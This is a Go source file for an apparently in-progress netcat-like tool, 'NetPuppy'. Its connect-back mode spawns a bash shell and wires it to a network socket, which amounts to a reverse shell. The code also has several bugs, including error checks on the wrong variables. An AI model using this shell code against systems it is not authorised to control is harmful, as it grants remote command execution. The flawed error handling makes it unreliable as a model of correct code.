/* TP U ARE HERE:
- re-organize the channels given new cb shell
- decide if the shell should be an option vs automatic
*/

package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"time"

	// NetPuppy modules:
	"netpuppy/utils"
)

func readFromUserShell(shellUserChannel chan<- string, stdout io.ReadCloser, stderr io.ReadCloser) {
	/*
		Depending on if the shell process is true on the peer struct
		we have 3 go routines. 2 for if the shell is true (readStdout, readStderr)
		and one if it's false (readUserInput)

		The go routines put data they get from their sources into the channel.
	*/

	readForStdout := func(stdout io.ReadCloser, shellUserChannel chan<- string) {
		// For loop checks for data in shell. stdout
		for {
			outData, err := io.ReadAll(stdout)
			if err != nil {
				fmt.Printf("Error reading data from stdout pipe: %v\n", err)
				os.Stderr.WriteString(err.Error() + "\n")
				os.Exit(1)
			}
			// If data: change to string and put in channel:
			cData := fmt.Sprintf("%v", outData)
			shellUserChannel <- cData
		}
		// Wait? Return?
	}

	readForStderr := func(stderr io.ReadCloser, shellUserChannel chan<- string) string {
		for {
			errData, err := io.ReadAll(stderr)
			if err != nil {
				fmt.Printf("Error reading data from stderr pipe: %v\n", err)
				os.Stderr.WriteString(err.Error() + "\n")
				os.Exit(1)
			}
			// If data: change to string and put in channel:
			cData := fmt.Sprintf("%v", errData)
			shellUserChannel <- cData
		}
		// Wait? Return?
	}

	readForUSerInput := func(reader *bufio.Reader, shellUserChannel chan<- string) {
		for {
			fmt.Print(">> ")
			text, _ := reader.ReadString('\n')
			if len(text) > 0 {
				shellUserChannel <- text
			}
		}
	}

	// HEY if this fuckx up, remember that we';ve already started the sehll (also pointers?)
	if stdout != nil { // We are the connect-back peer and --shell was given
		// Start separate go routines for capturing data from the shell:
		go readForStderr(stderr, shellUserChannel)
		go readForStdout(stdout, shellUserChannel)

		// If the command (bash shell exits), Wait will close the pipe:
		// WAIT

	} else { // if shellProcess is nil, then just get input from user:
		var reader *bufio.Reader = bufio.NewReader(os.Stdin) // POINTER: bufio.newReader returns a pointer
		go readForUSerInput(reader, shellUserChannel)
	}
}

func readFromSocket(socketChannel chan<- []byte, connection utils.Socket) {
	// Read from connection socket:
	for {
		// dataBytes, err := bufio.NewReader(connection).ReadBytes('\n')
		dataBytes, err := connection.Read()
		if err != nil {
			fmt.Printf("Error reading from socket: %v\n", err)
			os.Stderr.WriteString(err.Error())
			os.Exit(1)
			return
		}
		//socketReader <- dataBytes
		socketChannel <- dataBytes
	}
}

func runApp(c utils.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()

	// Print banner:
	fmt.Printf("%s", utils.Banner())

	// Create peer instance based on user input:
	var socket utils.Socket
	// POINTER: thisPeer is a pointer to the actual instance of Peer returned by CreatePeer:
	var thisPeer *utils.Peer = utils.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)

	// Update user:
	var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
	fmt.Println(updateUserBanner)

	// Make connection:
	if thisPeer.ConnectionType == "offense" {
		socket = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
		fmt.Printf("Address of socket in main.go: %v\n", socket)
	} else {
		socket = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address)
	}

	// Connect socket connection to peer
	thisPeer.Connection = socket

	var shell utils.BashShell
	// If shell flag is true, start shell:
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter utils.RealShellGetter
		fmt.Printf("This peer shell: %v\n", thisPeer.Shell)

		shell = realShellGetter.GetConnectBackInitiatedShell(thisPeer)

		// Connect shell to peer:
		thisPeer.ShellProcess = shell
	}

	// Update banner w/ missing port:
	// var missingPortInBanner = utils.PrintMissingPortToBanner(thisPeer.ConnectionType, thisPeer.Connection)
	// fmt.Println(missingPortInBanner)

	// Start SIGINT go routine:
	// Start channel to listen for SIGINT:
	listenForSIGINT(thisPeer)

	var stdin io.WriteCloser
	var stdout io.ReadCloser
	var stderr io.ReadCloser

	socketChannel := make(chan []byte)
	shellUserChannel := make(chan string)

	/*
		threads we need:
			- read from socket
			-

			- read from user/shell
			- print to user/shell
	*/

	// If this peer is cB & has a shell: get pipes and start
	// go routines to handle them
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		// Hook up the pipes:
		var err error
		stdout, err = thisPeer.ShellProcess.PipeStdout()
		if err != nil {
			fmt.Printf("Error getting stdout pipe from shell: %v\n", err)
			os.Stderr.WriteString(err.Error() + "\n")
			os.Exit(1)
		}

		var eRr error
		stdin, eRr = thisPeer.ShellProcess.PipeStdin()
		if err != nil {
			fmt.Printf("Error getting pipe for shell stdin: %v\n", eRr)
			os.Stderr.WriteString(eRr.Error() + "\n")
			os.Exit(1)
		}
		defer stdin.Close()

		var erro error
		stderr, erro = thisPeer.ShellProcess.PipeStderr()
		if err != nil {
			fmt.Printf("Error getting stderr pipe from shell: %v\n", erro)
			os.Stderr.WriteString(erro.Error() + "\n")
			os.Exit(1)
		}

		// Start shell:
		erR := thisPeer.ShellProcess.StartShell()
		if erR != nil {
			log.Fatalf("Error starting shell process: %v\n", erR)
		}

		// Start go routine to handle stdin & stdout
		readFromUserShell(shellUserChannel, stdout, stderr)
	} else { // If this peer does not need a shell, start go routine to read user input:
		// do we need to send nil?
		readFromUserShell(shellUserChannel, nil, nil)
	}

	// Start go routine for reading from socket:
	go readFromSocket(socketChannel, thisPeer.Connection)

	for {
		select {
		case socketBoundInput := <-shellUserChannel:
			fmt.Printf("ioReader: %v\n", socketBoundInput)
			// Reads shellUserChannel and writes the data to the socket:
			_, err := thisPeer.Connection.Write([]byte(socketBoundInput))

			if err != nil {
				// Quit here?
				fmt.Printf("Error in userInput select: %v\n", err)
				os.Stderr.WriteString(" " + err.Error() + "\n")
			}
		case socketIncoming := <-socketChannel:
			fmt.Printf("socketChannel value: %v\n", socketIncoming)
			// Convert bytes to string:
			sendString := fmt.Sprintf("%c", socketIncoming)

			// If we have a cb shell, data received from socket should be sent to shell stdin
			if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
				// Write socket data to stdin:
				fmt.Printf("converted: %v\n", string(sendString))
				_, err := io.WriteString(stdin, sendString)
				if err != nil {
					log.Fatalf("Error writing socket data to shell stdin: %v\n", err)
				}

			} else { // print data from socket to user:
				_, err := os.Stdout.Write(socketIncoming)
				if err != nil {
					// Quit here?
					fmt.Printf("Error in writing to stdout: %v\n", err)
					os.Stderr.WriteString(" " + err.Error() + "\n")
				}
			}
		default:
			time.Sleep(300 * time.Millisecond)
		}
	}
}

func listenForSIGINT(thisPeer *utils.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			if sig.String() == "interrupt" {
				fmt.Printf("signal: %v\n", sig)
				thisPeer.Connection.Close()
				os.Exit(2)
			}
		}
	}()
}

func main() {
	// In order to test the connection code w/o creating REAL sockets, runApp() handles most of the logic:
	var realConnection utils.RealConnectionGetter
	runApp(realConnection)
}
